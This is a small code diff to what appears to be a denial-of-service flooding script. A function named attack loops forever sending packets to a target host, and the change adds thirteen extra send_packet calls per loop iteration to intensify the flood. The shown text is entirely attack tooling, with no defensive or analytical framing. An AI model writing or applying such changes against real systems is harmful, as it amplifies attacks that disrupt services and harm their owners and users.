@@ -81,6 +81,19 @@ def send_packet(host,param_joiner):
 def attack(host,param_joiner):
 	while True:
 		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
+		send_packet(host,param_joiner)
 
 def parse_parameters(parameters):
 
